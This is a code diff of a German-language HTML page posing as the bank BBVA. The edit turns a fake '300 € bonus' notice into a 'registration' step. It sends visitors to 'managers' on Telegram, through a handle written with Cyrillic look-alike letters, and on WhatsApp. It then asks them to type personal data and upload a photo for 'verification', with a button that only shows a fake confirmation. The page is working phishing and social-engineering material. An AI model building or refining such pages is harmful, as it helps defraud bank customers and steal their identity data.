@@ -3,25 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fast fertig! - BBVA</title>
+    <title>Registrierung starten - BBVA</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container" style="max-width: 600px;">
         <main class="main-card">
-            <div style="font-size: 5rem; margin-bottom: 20px;">🎉</div>
-            <h1 class="title">Herzlichen Glückwunsch!</h1>
-            <p class="description">
-                Ihr 300 € Bonus wurde reserviert. Um die Auszahlung zu aktivieren, kontaktieren Sie bitte Ihren persönlichen Kontomanager zur Identitätsbestätigung.
+            <h1 class="title">Nächster Schritt</h1>
+            
+            <p class="description" style="margin-bottom: 25px;">
+                Um die Registrierung zu starten, müssen Sie zunächst einen unserer Manager kontaktieren. Wählen Sie unten Ihre bevorzugte Methode:
             </p>
             
             <a href="https://t.me/ВВА_official" class="btn-primary" style="background: #0088cc; width: 100%; margin-bottom: 15px;">
-                Über Telegram bestätigen
+                Über Telegram kontaktieren
             </a>
-            <a href="https://wa.me/34123456789" class="btn-primary" style="background: #25d366; width: 100%;">
-                Über WhatsApp bestätigen
+            <a href="https://wa.me/34123456789" class="btn-primary" style="background: #25d366; width: 100%; margin-bottom: 30px;">
+                Über WhatsApp kontaktieren
             </a>
+
+            <hr style="border-top: 1px solid #30363d; border-bottom: none; margin: 30px 0;">
+
+            <p class="description" style="font-size: 0.95rem; color: #c9d1d9; margin-bottom: 20px;">
+                Füllen Sie nach der Kontaktaufnahme mit dem Manager das untenstehende Formular aus, um Ihre Bereitschaft zur Verifizierung zu bestätigen.
+            </p>
+
+            <form class="verification-form">
+                <label for="user-data">Ihre Nachricht:</label>
+                <textarea id="user-data" rows="3" placeholder="Ich bin bereit, die Verifizierung durchzuführen. Meine Daten sind..."></textarea>
+
+                <label for="photo-upload">Laden Sie ein Foto hoch:</label>
+                <input type="file" id="photo-upload" accept="image/*" class="file-input">
+
+                <button type="button" class="btn-primary" style="width: 100%; margin-top: 10px; font-size: 1rem; padding: 15px;" onclick="alert('Ihre Daten wurden erfolgreich gesendet. Bitte warten Sie auf die Antwort des Managers.')">
+                    Daten senden
+                </button>
+            </form>
+
         </main>
     </div>
 </body>
